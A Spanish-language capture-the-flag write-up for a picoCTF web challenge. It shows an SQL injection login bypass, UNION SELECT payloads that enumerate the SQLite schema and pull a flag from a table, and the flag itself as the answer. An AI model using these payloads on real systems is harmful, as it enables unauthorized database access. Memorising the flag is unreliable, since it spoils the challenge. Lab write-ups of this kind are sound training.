#Software #Hacking #WebExplotation #Web #Internet 
# Definición
Can you find the flag on this website.

Try to find the flag [here](http://saturn.picoctf.net:56592/).
# Hints
- SQLiLite
# Solución
Utilizamos [[Inyección SQL]] para entrar:
username: juan' or 1 = 1;
password: juan' or 1 = 1;

Utilizamos [[Inyección SQL#Payloads en Inyección SQL (SQLi)]]:
' union select 1,2,3;
>Tres porque tenemos tres campos

Vemos que versión estamos trabajando:
' union select sqlite_version(),2,3;

Vemos la estructura de las demás tablas:
' union select sql,2,3 from sqlite_master;
Y me regresó esto -sospechamos que se encuentre en more_table, porque dice flag-.

| Tabla                                | Columnas                                                      |
|--------------------------------------|--------------------------------------------------------------|
| `hints`                              | `id INTEGER NOT NULL PRIMARY KEY`, `info TEXT`              |
| `more_table`                         | `id INTEGER NOT NULL PRIMARY KEY`, `flag TEXT`              |
| `offices`                            | `id INTEGER NOT NULL PRIMARY KEY`, `city TEXT`, `address TEXT`, `phone TEXT` |
| `users`                              | `name TEXT NOT NULL PRIMARY KEY`, `password TEXT`, `id INTEGER` |
Entonces seleccionamos esa tabla
' union select id,flag,3 from more_table;

Y nos regresa esto:
|picoCTF{G3tting_5QL_1nJ3c7I0N_l1k3_y0u_sh0ulD_3b0fca37}|
## Respuesta
picoCTF{G3tting_5QL_1nJ3c7I0N_l1k3_y0u_sh0ulD_3b0fca37}